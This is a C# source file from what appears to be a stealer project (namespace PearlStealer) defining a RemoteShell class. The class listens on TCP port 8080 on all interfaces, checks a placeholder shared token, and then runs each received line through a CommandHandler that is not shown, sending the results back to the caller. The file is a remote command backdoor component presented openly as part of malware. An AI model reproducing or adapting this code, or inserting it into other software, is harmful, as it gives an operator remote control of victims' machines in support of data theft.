using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace PearlStealer
{
    internal class RemoteShell
    {
        private const uint BufferSize = 4096;
        private const int Port = 8080;
        private const string SharedToken = "CHANGE_TO_A_LONG_RANDOM_SECRET";

        private static async Task Main()
        {
            var listener = new TcpListener(IPAddress.Any, Port);
            Console.CancelKeyPress += (_, e) =>
            {
                e.Cancel = true;
                listener.Stop();
            };

            try
            {
                listener.Start();
                Console.WriteLine($"TCP server listening on port {Port}.");

                while (true)
                {
                    TcpClient client = await listener.AcceptTcpClientAsync();
                    _ = HandleClientAsync(client);
                }
            }
            catch (SocketException)
            {
                Console.WriteLine("TCP listener stopped.");
            }
            catch (ObjectDisposedException)
            {
                Console.WriteLine("TCP listener closed.");
            }
            finally
            {
                listener.Stop();
            }
        }

        private static async Task HandleClientAsync(TcpClient client)
        {
            using (client)
            {
                try
                {
                    using NetworkStream stream = client.GetStream();
                    using var reader = new StreamReader(stream, Encoding.UTF8);
                    using var writer = new StreamWriter(stream, Encoding.UTF8)
                    {
                        AutoFlush = true
                    };

                    string? token = await reader.ReadLineAsync();

                    if (token is null ||
                        !CryptographicOperations.FixedTimeEquals(
                            Encoding.UTF8.GetBytes(token),
                            Encoding.UTF8.GetBytes(SharedToken)))
                    {
                        await writer.WriteLineAsync("ERROR: Authentication failed");
                        return;
                    }

                    await writer.WriteLineAsync("OK");

                    while (true)
                    {
                        string? command = await reader.ReadLineAsync();

                        if (command is null)
                            break;

                        string result = CommandHandler.Execute(command);

                        await writer.WriteLineAsync(result);

                        if (command.Trim().Equals(
                            "STOP",
                            StringComparison.OrdinalIgnoreCase))
                        {
                            break;
                        }
                    }
                }
                catch (IOException ex)
                {
                    Console.WriteLine($"Communication error: {ex.Message}");
                }
                catch (SocketException ex)
                {
                    Console.WriteLine($"TCP error: {ex.Message}");
                }
            }
        }
    }
}